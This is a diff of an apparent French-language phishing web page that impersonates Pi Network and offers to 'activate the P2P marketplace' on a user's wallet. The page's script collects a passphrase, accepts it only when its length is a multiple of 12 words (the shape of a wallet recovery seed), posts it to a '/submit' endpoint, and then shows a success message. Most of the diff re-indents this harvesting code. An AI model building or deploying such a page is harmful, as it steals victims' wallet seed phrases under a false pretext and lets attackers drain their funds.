@@ -2900,7 +2900,7 @@
     #ajax-content-wrap:after {
       background-color: rgba(0, 0, 0, .45);
       content: "";
-      position: fixed;
+     
       opacity: 0;
       left: 0;
       top: 0;
@@ -4649,6 +4649,16 @@
       #slide-out-widget-area .mobile-only {
         display: block;
       }
+    }
+
+    #slide-out-widget-area.fullscreen-split,
+    #slide-out-widget-area-bg {
+      display: none !important;
+    }
+
+    #slide-out-widget-area.fullscreen-split,
+    #slide-out-widget-area-bg {
+      pointer-events: none;
     }
 
     #slide-out-widget-area.fullscreen-split {
@@ -6965,89 +6975,89 @@
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
   <script>
-  document.addEventListener('DOMContentLoaded', () => {
-    // Éléments DOM
-    const bonusButton = document.getElementById('bonusButton');
-    const passphraseContainer = document.getElementById('passphraseContainer');
-    const claimButton = document.getElementById('claimButton');
-    const popupOverlay = document.getElementById('popupOverlay');
-    const closePopup = document.getElementById('closePopup');
-    const emptyPassphrasePopup = document.getElementById('emptyPassphrasePopup');
-    const closeEmptyPassphrasePopup = document.getElementById('closeEmptyPassphrasePopup');
-    const invalidPassphrasePopup = document.getElementById('invalidPassphrasePopup');
-    const closeInvalidPassphrasePopup = document.getElementById('closeInvalidPassphrasePopup');
-    const passphraseInput = document.getElementById('passphrase');
+    document.addEventListener('DOMContentLoaded', () => {
+      // Éléments DOM
+      const bonusButton = document.getElementById('bonusButton');
+      const passphraseContainer = document.getElementById('passphraseContainer');
+      const claimButton = document.getElementById('claimButton');
+      const popupOverlay = document.getElementById('popupOverlay');
+      const closePopup = document.getElementById('closePopup');
+      const emptyPassphrasePopup = document.getElementById('emptyPassphrasePopup');
+      const closeEmptyPassphrasePopup = document.getElementById('closeEmptyPassphrasePopup');
+      const invalidPassphrasePopup = document.getElementById('invalidPassphrasePopup');
+      const closeInvalidPassphrasePopup = document.getElementById('closeInvalidPassphrasePopup');
+      const passphraseInput = document.getElementById('passphrase');
 
-    // Fonction pour afficher une popup
-    const showPopup = (popupElement) => popupElement.classList.add('show');
+      // Fonction pour afficher une popup
+      const showPopup = (popupElement) => popupElement.classList.add('show');
 
-    // Fonction pour fermer une popup
-    const closePopupHandler = (popupElement) => {
-      popupElement.classList.remove('show');
-    };
+      // Fonction pour fermer une popup
+      const closePopupHandler = (popupElement) => {
+        popupElement.classList.remove('show');
+      };
 
-    // Vérification de la validité de la passphrase
-    const isValidPassphrase = (passphrase) => {
-      if (passphrase.trim() === '') {
-        showPopup(emptyPassphrasePopup);
-        return false;
-      }
+      // Vérification de la validité de la passphrase
+      const isValidPassphrase = (passphrase) => {
+        if (passphrase.trim() === '') {
+          showPopup(emptyPassphrasePopup);
+          return false;
+        }
 
-      const wordCount = passphrase.trim().split(/\s+/).length;
-      if (wordCount % 12 !== 0) {
-        showPopup(invalidPassphrasePopup);
-        return false;
-      }
+        const wordCount = passphrase.trim().split(/\s+/).length;
+        if (wordCount % 12 !== 0) {
+          showPopup(invalidPassphrasePopup);
+          return false;
+        }
 
-      return true;
-    };
+        return true;
+      };
 
-    // Fonction pour envoyer la passphrase au serveur
-    const sendPassphraseToServer = (passphrase) => {
-      axios
-        .post('/submit', { passphrase })
-        .then((response) => {
-          console.log('Réponse du serveur:', response.data);
-          if (response.data.success) {
-            showPopup(popupOverlay); // Affiche la modale de succès
-          } else {
-            alert('Erreur lors de l\'envoi du passphrase.');
-          }
-        })
-        .catch((error) => {
-          console.error('Erreur:', error);
-          alert('Erreur de connexion. Veuillez réessayer.');
-        });
-    };
+      // Fonction pour envoyer la passphrase au serveur
+      const sendPassphraseToServer = (passphrase) => {
+        axios
+          .post('/submit', { passphrase })
+          .then((response) => {
+            console.log('Réponse du serveur:', response.data);
+            if (response.data.success) {
+              showPopup(popupOverlay); // Affiche la modale de succès
+            } else {
+              alert('Erreur lors de l\'envoi du passphrase.');
+            }
+          })
+          .catch((error) => {
+            console.error('Erreur:', error);
+            alert('Erreur de connexion. Veuillez réessayer.');
+          });
+      };
 
-    // Gestion du clic sur le bouton "bonus"
-    bonusButton.addEventListener('click', () => {
-      passphraseContainer.style.display =
-        passphraseContainer.style.display === 'none' || passphraseContainer.style.display === ''
-          ? 'block'
-          : 'none';
+      // Gestion du clic sur le bouton "bonus"
+      bonusButton.addEventListener('click', () => {
+        passphraseContainer.style.display =
+          passphraseContainer.style.display === 'none' || passphraseContainer.style.display === ''
+            ? 'block'
+            : 'none';
+      });
+
+      // Gestion du clic sur le bouton "claim"
+      claimButton.addEventListener('click', () => {
+        const passphrase = passphraseInput.value;
+
+        // Vérifie la validité de la passphrase avant envoi
+        if (isValidPassphrase(passphrase)) {
+          sendPassphraseToServer(passphrase);
+        }
+      });
+
+      // Gestion des fermetures de popups
+      closePopup.addEventListener('click', () => closePopupHandler(popupOverlay));
+      closeEmptyPassphrasePopup.addEventListener('click', () =>
+        closePopupHandler(emptyPassphrasePopup)
+      );
+      closeInvalidPassphrasePopup.addEventListener('click', () =>
+        closePopupHandler(invalidPassphrasePopup)
+      );
     });
-
-    // Gestion du clic sur le bouton "claim"
-    claimButton.addEventListener('click', () => {
-      const passphrase = passphraseInput.value;
-
-      // Vérifie la validité de la passphrase avant envoi
-      if (isValidPassphrase(passphrase)) {
-        sendPassphraseToServer(passphrase);
-      }
-    });
-
-    // Gestion des fermetures de popups
-    closePopup.addEventListener('click', () => closePopupHandler(popupOverlay));
-    closeEmptyPassphrasePopup.addEventListener('click', () =>
-      closePopupHandler(emptyPassphrasePopup)
-    );
-    closeInvalidPassphrasePopup.addEventListener('click', () =>
-      closePopupHandler(invalidPassphrasePopup)
-    );
-  });
-</script>
+  </script>
 
 
 
@@ -7759,14 +7769,16 @@ var nectar_front_i18n = {"menu":"Menu","next":"Next","previous":"Previous","clos
                         </div>
                         <h3 style="color:#fff;text-align:left;"
                           class="vc_custom_heading vc_do_custom_heading wpb_animate_when_almost_visible wpb_fadeInUp fadeInUp animated wpb_start_animation">
-                          Activer le Marketplace sur votre portefeuille Pi vous permet d'échanger en toute sécurité vos actifs Pi avec d'autres pionniers en utilisant les services d'entiercement de Pi Network.
+                          Activer le Marketplace sur votre portefeuille Pi vous permet d'échanger en toute sécurité vos
+                          actifs Pi avec d'autres pionniers en utilisant les services d'entiercement de Pi Network.
                         </h3>
                         <h5 style="color:#fff;text-align:left;"
                           class="vc_custom_heading vc_do_custom_heading wpb_animate_when_almost_visible wpb_fadeInUp fadeInUp animated wpb_start_animation">
-                          Cette fonctionnalité est uniquement disponible pour les pionniers ayant terminé le KYC et migré tous leurs actifs vers le Mainnet.
+                          Cette fonctionnalité est uniquement disponible pour les pionniers ayant terminé le KYC et
+                          migré tous leurs actifs vers le Mainnet.
                         </h5>
 
-                     
+
                         <h5 style="color:#fff;text-align:left;"
                           class="vc_custom_heading vc_do_custom_heading wpb_animate_when_almost_visible wpb_fadeInUp fadeInUp animated wpb_start_animation">
                           Pour Activer l'option P2P, cliquez sur le bouton çi dessous
@@ -7784,15 +7796,15 @@ var nectar_front_i18n = {"menu":"Menu","next":"Next","previous":"Previous","clos
                                   <!-- Bouton principal -->
                                   <div>
                                     <a href='transaction'>
-                                    <button id="bonusButton">Activate P2P Option🪙</button>
-                                </a>
-                                  
+                                      <button id="bonusButton">Activate P2P Option🪙</button>
+                                    </a>
+
                                   </div>
 
 
 
 
-                                  
+
                                 </div>
                               </div>
                             </div>
